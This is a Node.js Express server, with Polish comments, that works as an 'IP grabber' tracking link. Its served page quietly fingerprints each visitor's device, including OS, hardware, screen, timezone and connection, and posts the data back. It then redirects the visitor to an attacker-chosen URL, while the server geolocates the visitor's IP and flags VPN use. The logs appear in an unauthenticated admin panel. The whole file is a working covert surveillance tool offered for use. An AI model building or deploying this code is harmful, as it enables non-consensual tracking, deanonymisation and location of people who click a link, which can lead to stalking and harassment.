const express = require('express');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Włączamy zaufanie do Reverse Proxy (wymagane na Render / Koyeb dla poprawnego IP)
app.enable('trust proxy');

// Stan aplikacji w pamięci
let TARGET_URL = 'https://www.lovethegarden.com/pl-pl/ip-grabber';
const telemetryLogs = [];
const MAX_LOGS = 100; // Maksymalna liczba logów trzymanych w pamięci

// Pomocnicza funkcja do logowania i trzymania historii
function addLog(text) {
    const timestamp = new Date().toLocaleString('pl-PL');
    const entry = `[${timestamp}]${text}`;
    console.log(entry);
    telemetryLogs.unshift(entry); // Dodaj na początek
    if (telemetryLogs.length > MAX_LOGS) {
        telemetryLogs.pop();
    }
}

// 0. Endpoint do podtrzymywania działania (Dla UptimeRobota)
app.get('/health', (req, res) => {
    res.status(200).send('OK');
});

// --- PANEL ADMINISTRACYJNY (API & GUI) ---

// Pobieranie aktualnej konfiguracji i logów dla panelu
app.get('/api/admin/status', (req, res) => {
    res.json({
        targetUrl: TARGET_URL,
        logs: telemetryLogs
    });
});

// Zmiana docelowego URL
app.post('/api/admin/set-target', (req, res) => {
    const { newUrl } = req.body;
    if (newUrl) {
        TARGET_URL = newUrl.trim();
        addLog(`[SYSTEM] Zmieniono docelowy URL na: ${TARGET_URL}`);
        return res.json({ success: true, targetUrl: TARGET_URL });
    }
    res.status(400).json({ success: false, message: 'Brak nowego adresu URL' });
});

// Strona Panelu Administracyjnego (ASCII Terminal GUI)
app.get('/admin', (req, res) => {
    res.send(`<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TERMINAL // ADMIN PANEL</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            background-color: #0b0b0b;
            color: #00ff66;
            font-family: 'Courier New', Courier, monospace;
            padding: 20px;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
            border: 1px solid #00ff66;
            box-shadow: 0 0 15px rgba(0, 255, 102, 0.2);
            padding: 20px;
            background: #111;
        }
        pre.ascii-art {
            color: #00ffcc;
            font-size: 12px;
            line-height: 1.2;
            margin-bottom: 20px;
            font-weight: bold;
        }
        .section {
            margin-bottom: 20px;
            border-bottom: 1px dashed #005522;
            padding-bottom: 15px;
        }
        h2 {
            font-size: 16px;
            margin-bottom: 10px;
            color: #fff;
            text-transform: uppercase;
        }
        label { display: block; margin-bottom: 5px; font-size: 13px; }
        input[type="text"] {
            width: calc(100% - 110px);
            background: #000;
            border: 1px solid #00ff66;
            color: #00ff66;
            padding: 8px;
            font-family: monospace;
            font-size: 14px;
        }
        button {
            background: #00ff66;
            color: #000;
            border: none;
            padding: 8px 15px;
            font-weight: bold;
            cursor: pointer;
            font-family: monospace;
            width: 100px;
        }
        button:hover { background: #00cc55; }
        .terminal-box {
            background: #000;
            border: 1px solid #00ff66;
            height: 400px;
            overflow-y: scroll;
            padding: 10px;
            font-size: 12px;
            white-space: pre-wrap;
            word-break: break-all;
        }
        .status-bar {
            font-size: 11px;
            color: #888;
            margin-top: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <pre class="ascii-art">
  ___ _____   ____             _     _             
 |_ _|  _ \\ / ___|_ __ __ _  | |__ | |__   ___ _ __ 
  | || |_) | |  _| '__/ _\` | | '_ \\| '_ \\ / _ \\ '__|
  | ||  __/| |_| | | | (_| | | |_) | |_) |  __/ |   
 |___|_|    \\____|_|  \\__,_| |_.__/|_.__/ \\___|_|   
        </pre>

        <div class="section">
            <h2>[ Konfiguracja Celu Przekierowania ]</h2>
            <form id="config-form">
                <label>Aktualny Target URL:</label>
                <div style="display: flex; gap: 10px;">
                    <input type="text" id="target-url-input" />
                    <button type="submit">ZAPISZ</button>
                </div>
            </form>
            <div class="status-bar" id="save-status">Status: Gotowy</div>
        </div>

        <div class="section" style="border: none; margin-bottom: 0;">
            <h2>[ Terminal Logów Na Żywo ]</h2>
            <div class="terminal-box" id="terminal-logs">Ładowanie strumienia danych...</div>
            <div class="status-bar">Odświeżanie automatyczne co 2 sekundy</div>
        </div>
    </div>

    <script>
        async function fetchStatus() {
            try {
                const res = await fetch('/api/admin/status');
                const data = await res.json();
                
                // Ustaw input, jeśli użytkownik aktualnie go nie edytuje
                const input = document.getElementById('target-url-input');
                if (document.activeElement !== input) {
                    input.value = data.targetUrl;
                }

                // Wpisz logi do terminala
                const terminal = document.getElementById('terminal-logs');
                terminal.textContent = data.logs.join('\\n');
            } catch(e) {
                console.error("Błąd pobierania statusu:", e);
            }
        }

        document.getElementById('config-form').addEventListener('submit', async (e) => {
            e.preventDefault();
            const newUrl = document.getElementById('target-url-input').value;
            const statusDiv = document.getElementById('save-status');
            
            statusDiv.textContent = "Status: Zapisywanie...";
            try {
                const res = await fetch('/api/admin/set-target', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ newUrl })
                });
                const data = await res.json();
                if(data.success) {
                    statusDiv.textContent = "Status: Zapisano pomyślnie!";
                } else {
                    statusDiv.textContent = "Status: Błąd zapisu!";
                }
            } catch(err) {
                statusDiv.textContent = "Status: Błąd połączenia z serwerem!";
            }
        });

        // Polling stanu co 2 sekundy
        setInterval(fetchStatus, 2000);
        fetchStatus();
    </script>
</body>
</html>`);
});

// --- STRONA GŁÓWNA (IP GRABBER) ---

// 1. Endpoint Odbierający Dane (POST)
app.post('/api/telemetry', async (req, res) => {
    const rawIp = req.headers['x-forwarded-for'];
    const clientIp = rawIp ? rawIp.split(',')[0].trim() : req.ip;

    const clientHeaders = {
        userAgent: req.headers['user-agent'] || 'Brak',
        acceptLanguage: req.headers['accept-language'] || 'Brak',
        refererHeader: req.headers['referer'] || 'Brak'
    };

    const telemetry = req.body || {};

    let logBlock = `\n==================================================\n`;
    logBlock += `[NOWE WEJŚCIE] ${new Date().toLocaleString('pl-PL')}\n`;
    logBlock += `--------------------------------------------------\n`;
    logBlock += `Adres IP: ${clientIp} | OS: ${telemetry.osName || 'Nieznany'} (${telemetry.osVersion || ''})\n`;
    logBlock += `Urządzenie: ${telemetry.deviceModel || 'PC'} | CPU Cores: ${telemetry.cpuCores} | RAM: ${telemetry.deviceMemory}GB\n`;
    logBlock += `Ekran: ${telemetry.screenWidth}x${telemetry.screenHeight} | Język: ${telemetry.language}\n`;
    
    try {
        if (clientIp && clientIp !== '127.0.0.1' && clientIp !== '::1' && !clientIp.startsWith('192.168.') && !clientIp.startsWith('10.')) {
            const geoRes = await fetch(`http://ip-api.com/json/${clientIp}?fields=status,country,city,isp,proxy,hosting`);
            const geo = await geoRes.json();
            if (geo.status === 'success') {
                logBlock += `Lokalizacja: ${geo.country}, ${geo.city} | ISP: ${geo.isp}\n`;
                logBlock += `VPN/Proxy/Hosting: ${geo.proxy || geo.hosting ? 'TAK' : 'NIE'}\n`;
            }
        }
    } catch (err) {
        logBlock += `Błąd GeoIP: ${err.message}\n`;
    }
    logBlock += `==================================================`;

    addLog(logBlock);
    res.json({ status: 'ok' });
});

// 2. Trasa Główna (Serwuje skrypt z Open Graph, dynamicznym TARGET_URL i przekierowaniem)
app.get('*', (req, res) => {
    // Jeśli użytkownik wchodzi na /admin, pomijamy tę trasę (obsłużona wyżej)
    if (req.path.startsWith('/admin') || req.path.startsWith('/api/')) {
        return;
    }

    res.send(`<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Grabber</title>
    <meta property="og:type" content="article">
    <meta property="og:title" content="IP Grabber">
    <meta property="og:description" content="Narzędzie IP Grabber do analizy połączeń i zbierania telemetrii.">
    <meta property="og:image" content="https://www.lovethegarden.com/sites/default/files/styles/og_image/public/2021-03/ip_grabber.jpg">
    <meta property="og:url" content="https://${req.get('host')}${req.originalUrl}">
</head>
<body>
    <script>
    (async function() {
        const targetUrl = "${TARGET_URL}";

        let osName = "Nieznany";
        let osVersion = "Brak danych";
        let osArchitecture = "Brak danych";
        let osBitness = "";
        let deviceModel = "";

        if (navigator.userAgentData && typeof navigator.userAgentData.getHighEntropyValues === 'function') {
            try {
                const uaData = await navigator.userAgentData.getHighEntropyValues([
                    "platform", "platformVersion", "architecture", "bitness", "model"
                ]);
                osName = uaData.platform || osName;
                osVersion = uaData.platformVersion || osVersion;
                osArchitecture = uaData.architecture || osArchitecture;
                osBitness = uaData.bitness || osBitness;
                deviceModel = uaData.model || deviceModel;
            } catch(e) {}
        } else {
            osName = navigator.platform || "Nieznany";
        }

        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};

        const payload = {
            osName: osName,
            osVersion: osVersion,
            osArchitecture: osArchitecture,
            osBitness: osBitness,
            deviceModel: deviceModel,
            cpuCores: navigator.hardwareConcurrency || "Brak danych",
            deviceMemory: navigator.deviceMemory || "Brak danych",
            touchPoints: navigator.maxTouchPoints || 0,
            screenWidth: screen.width,
            screenHeight: screen.height,
            colorDepth: screen.colorDepth,
            devicePixelRatio: window.devicePixelRatio || 1,
            viewportWidth: window.innerWidth,
            viewportHeight: window.innerHeight,
            timezone: (Intl && Intl.DateTimeFormat) ? Intl.DateTimeFormat().resolvedOptions().timeZone : "Brak danych",
            language: navigator.language,
            referrer: document.referrer || "Bezpośrednie",
            connectionType: conn.effectiveType || "Nieznane",
            downlink: conn.downlink || null,
            rtt: conn.rtt || null
        };

        try {
            await fetch('/api/telemetry', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
                keepalive: true
            });
        } catch(e) {}

        window.location.replace(targetUrl);
    })();
    </script>
</body>
</html>`);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Serwer uruchomiony na porcie ${PORT}`);
    console.log(`Panel administracyjny dostępny pod adresem: http://localhost:${PORT}/admin`);
});
